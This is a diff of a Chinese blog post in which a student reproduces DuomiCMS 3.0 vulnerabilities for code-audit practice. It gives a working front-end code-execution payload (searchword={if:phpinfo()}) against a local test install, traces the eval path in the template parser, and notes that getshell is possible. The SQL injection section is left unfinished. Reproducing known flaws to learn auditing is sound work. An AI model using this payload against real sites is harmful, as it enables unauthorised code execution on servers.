@@ -11,18 +11,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，起的早，不知道来不来得及复现一个漏洞。突然体会到以前一个学长说的，大学是社会的缩影。8说了，跟着七月火师傅的文章复现漏洞。">
+  <meta name="description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。">
 <meta name="keywords" content="cms,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DuomiCMS3.0漏洞复现">
 <meta property="og:url" content="https://glotozz.github.io/2019/09/26/DuomiCMS3-0漏洞复现/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，起的早，不知道来不来得及复现一个漏洞。突然体会到以前一个学长说的，大学是社会的缩影。8说了，跟着七月火师傅的文章复现漏洞。">
+<meta property="og:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-25T22:49:51.526Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/zq6PJI1l7foYyBd.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/Cy7VeMEb5v4ptRA.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/5AJ8cvaYbdiVCE4.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/qD6shGywfbBEC21.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/W2hRqNHMBArZ8mJ.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/NOKt2cPqJfb4HBm.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/vk2Rt4AF7yErdgM.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/WP6VxQLvKAo9t7E.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/27/Wbm6URAkLco5ufP.png">
+<meta property="og:updated_time" content="2019-09-27T08:56:45.752Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DuomiCMS3.0漏洞复现">
-<meta name="twitter:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，起的早，不知道来不来得及复现一个漏洞。突然体会到以前一个学长说的，大学是社会的缩影。8说了，跟着七月火师傅的文章复现漏洞。">
+<meta name="twitter:description" content="今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/27/zq6PJI1l7foYyBd.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -172,17 +182,71 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，起的早，不知道来不来得及复现一个漏洞。突然体会到以前一个学长说的，大学是社会的缩影。8说了，跟着七月火师傅的文章复现漏洞。</p>
+<p>今天又是课拉满的一天，因为教务处的一些事情搞得自己没睡好，突然体会到以前一个学长说的，大学是社会的缩影。起的早，但是等下还要打卡。不知道来不来得及复现一个漏洞。8说了，跟着七月火师傅的文章复现漏洞。</p>
 </blockquote>
 <meta name="referrer" content="no-referrer">
-
 <a id="more"></a>
 
 <h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>DuomiCMS3.0</p>
-<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><blockquote>
-<p>漏洞一</p>
+<blockquote>
+<p>duomicms的官网打不开了=。=，网上能找到的好像最高只有2.0版本的，和没有说清楚版本的，在下面的链接下载了    2.0    ，V3.0中存在的漏洞V2.0应该也存在😂</p>
 </blockquote>
-<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/2828" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828</a></p>
+<p><a href="http://down.chinaz.com/soft/37480.htm" target="_blank" rel="noopener">http://down.chinaz.com/soft/37480.htm</a></p>
+<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><blockquote>
+<p>漏洞一    前台代码执行</p>
+</blockquote>
+<p>paylaod：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/duomi/search.php?searchword=&#123;if:phpinfo()&#125;phpinfo()&#123;end</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/27/zq6PJI1l7foYyBd.png" alt="1569545852211.png"></p>
+<blockquote>
+<p>漏洞二    sql注入</p>
+</blockquote>
+<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
+<p>漏洞一 </p>
+</blockquote>
+<p>搜索eval，</p>
+<p><img src="https://i.loli.net/2019/09/27/Cy7VeMEb5v4ptRA.png" alt="Snipaste_2019-09-27_09-35-44.png"></p>
+<p>跟踪一个</p>
+<p><img src="https://i.loli.net/2019/09/27/5AJ8cvaYbdiVCE4.png" alt="Snipaste_2019-09-27_09-39-20.png"></p>
+<p>感觉和之前海洋cms的命令执行有点像。。。😀</p>
+<p>搜索哪里调用了parseIf这个函数，发现index.php、search.php等多处调用，比如挑选search.php</p>
+<p><img src="https://i.loli.net/2019/09/27/qD6shGywfbBEC21.png" alt="Snipaste_2019-09-27_10-07-48.png"></p>
+<p>跟踪replaceCurrentTypeId()</p>
+<p><img src="https://i.loli.net/2019/09/27/W2hRqNHMBArZ8mJ.png" alt="Snipaste_2019-09-27_10-08-09.png"></p>
+<p>存在替换</p>
+<p>再搜索$content</p>
+<p><img src="https://i.loli.net/2019/09/27/NOKt2cPqJfb4HBm.png" alt="Snipaste_2019-09-27_10-10-41.png"></p>
+<p><img src="https://i.loli.net/2019/09/27/vk2Rt4AF7yErdgM.png" alt="Snipaste_2019-09-27_10-20-42.png"></p>
+<p>搜索$cacheName，</p>
+<p><img src="https://i.loli.net/2019/09/27/WP6VxQLvKAo9t7E.png" alt="Snipaste_2019-09-27_10-19-18.png"></p>
+<p>搜索$searchword，</p>
+<p><img src="https://i.loli.net/2019/09/27/Wbm6URAkLco5ufP.png" alt="Snipaste_2019-09-27_10-37-09.png"></p>
+<p>xss过滤和addslashes对我们的payload没有影响，截取前20位</p>
+<p>理一理思路，大概就是从parse_search_读取模板内容，将模板中的内容进行相应的替换，</p>
+<p>开始构造payload</p>
+<p>要求开头为{if:    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br></pre></td></tr></table></figure>
+
+<p>然后进行正则匹配，存入$iar数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br></pre></td></tr></table></figure>
+
+<p>parseStrIf()函数处理=，没啥影响，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function parseStrIf($strIf)</span><br><span class="line">	&#123;</span><br><span class="line">		if(strpos($strIf,&apos;=&apos;)===false)</span><br><span class="line">		&#123;</span><br><span class="line">			return $strIf;</span><br><span class="line">		&#125;</span><br><span class="line">		if((strpos($strIf,&apos;==&apos;)===false)&amp;&amp;(strpos($strIf,&apos;=&apos;)&gt;0))</span><br><span class="line">		&#123;</span><br><span class="line">			$strIf=str_replace(&apos;=&apos;, &apos;==&apos;, $strIf);</span><br><span class="line">		&#125;</span><br><span class="line">		$strIfArr =  explode(&apos;==&apos;,$strIf);</span><br><span class="line">		return (empty($strIfArr[0])?&apos;NULL&apos;:$strIfArr[0]).&quot;==&quot;.(empty($strIfArr[1])?&apos;NULL&apos;:$strIfArr[1]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造时直接如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval(&quot;if(phpinfo())&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchword=&#123;if:phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以getshell，除去{if:}这5个字符，还剩15个😁</p>
+<blockquote>
+<p>漏洞二    七月火师傅是根据cnvd上的通告（只提供了漏洞位置），自己找漏洞成原。对于代码审计来说，这是一种很好的学习方法👍</p>
+</blockquote>
+<p>我也先自己找找试试。。。</p>
+<p>已知sql注入漏洞存在duomiphp/ajax.php</p>
+<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/2828" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828</a></p>
 
       
 
@@ -328,7 +392,7 @@
   
   
     <a href="/2019/09/24/Dedecms漏洞分析-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Dedecms漏洞分析-2</div>
+      <div class="article-nav-title">Dedecms漏洞复现-2</div>
       <i class="icon-circle-right"></i>
     </a>
   
